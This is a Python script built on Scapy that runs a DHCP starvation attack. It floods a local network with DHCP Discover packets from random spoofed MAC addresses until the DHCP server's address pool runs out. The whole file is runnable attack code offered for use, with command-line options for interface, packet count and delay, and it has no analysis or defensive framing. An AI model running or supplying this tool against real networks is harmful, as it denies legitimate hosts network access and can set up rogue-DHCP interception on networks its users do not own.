#!/bin/env

from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC
import time
import argparse
import sys
import os

def dhcp_starvation(interface, count=100, delay=0.1):
    """
    Perform a DHCP starvation attack by sending DHCP Discover messages with random MAC addresses.

    :param interface: Network interface to use (e.g., 'eth0' or 'wlan0').
    :param count: Number of DHCP Discover messages to send.
    :param delay: Delay between sending each packet (in seconds).
    """
    print(f"[*] Starting DHCP starvation attack on interface {interface}...")

    for i in range(count):
        # Generate a random MAC address
        client_mac = RandMAC()

        # Convert MAC address to bytes (remove colons and convert to bytes)
        client_mac_bytes = bytes.fromhex(client_mac.replace(":", ""))

        # Pad the MAC address to 16 bytes (required by BOOTP)
        client_mac_padded = client_mac_bytes.ljust(16, b'\x00')

        # Craft DHCP Discover packet
        dhcp_discover = (
            Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")  # Broadcast destination
            / IP(src="0.0.0.0", dst="255.255.255.255")      # Broadcast IP
            / UDP(sport=68, dport=67)                       # DHCP ports
            / BOOTP(chaddr=client_mac_padded)               # Client MAC address as bytes (padded to 16 bytes)
            / DHCP(options=[("message-type", "discover"), "end"])
        )

        try:
            # Send the packet
            sendp(dhcp_discover, iface=interface, verbose=False)
            print(f"[+] Sent DHCP Discover packet {i + 1}/{count} with MAC: {client_mac}")
        except Exception as e:
            print(f"[-] Error sending packet: {e}")
            break

        # Delay between packets
        time.sleep(delay)

    print("[*] DHCP starvation attack completed.")

if __name__ == "__main__":
    # Check if the script is run with root privileges
    if os.geteuid() != 0:
        print("[-] This script must be run as root. Use sudo.")
        sys.exit(1)

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="DHCP Starvation Attack Script")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0, wlan0)")
    parser.add_argument("-c", "--count", type=int, default=100, help="Number of DHCP Discover messages to send")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Delay between packets (in seconds)")
    args = parser.parse_args()

    # Start the DHCP starvation attack
    dhcp_starvation(interface=args.interface, count=args.count, delay=args.delay)
